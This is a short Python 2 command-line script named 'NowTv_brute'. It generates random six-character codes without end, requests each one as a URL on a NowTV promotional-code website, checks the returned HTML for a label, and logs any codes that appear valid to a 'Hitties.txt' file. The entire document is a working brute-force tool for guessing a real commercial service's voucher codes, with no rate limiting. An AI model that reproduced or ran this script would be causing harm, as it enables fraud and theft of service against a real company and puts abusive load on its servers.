# -*- coding: cp1252 -*-
import requests
from pyquery import PyQuery
import random
import sys


def get_html():
    html = connection.text[:100]
    pq = PyQuery(html)
    
    tag = pq(connection.content)
    lol = (tag('label').text())
    print lol
    if lol == '':
        with open("Hitties.txt","a") as myfile:
            myfile.write(''.join(characters))
            myfile.write('\n')
                
def helpp():
    print("[*] Okay son, these are the commands. ")
    print("help    - To show this menu. ")
    print("start   - To start cracking codes. ")
    print("version - To print out the version. ")
    print("\n")
def versione():
    print("[*] NowTv_brute ")
    print("[*] Version : 0.1 Alpha")
def scusa():
    print("[*] I didn't got what you typed.")
    print("[*] Please type 'help' to see the commands. \n")
letters = ['a','b','c','d','e','f','g','h','i','l','m','n','o','p','q','r','s','t','u','v','w','y','k','z','1','2','3','4','5','6','7','8','9','0']
characters = ['0','0','0','0','0','0']
hellp = 'help'
start = 'start'
version = 'version'
print("[*] Welcome to NowTv_brute.")
print("[*] Type Help if it's your first time. \n")
Startato = False
try:
    while Startato == False:
        wattado = raw_input('')
        if wattado == hellp:
            helpp()
        elif wattado == start:
            Startato = True
            active = True
            while active:
                for i in range(1,7):
                    characters[(i - 1)] = random.choice(letters)
                print("trying with code "+''.join(characters))
                connection = requests.get('http://www.nowtvnight.com/'+str(''.join(characters)))
                get_html()
        elif wattado == version:
            versione()
        else:
            scusa()
            print()
except Exception:
    print("[*] Generic error. ")
    sys.exit(1)
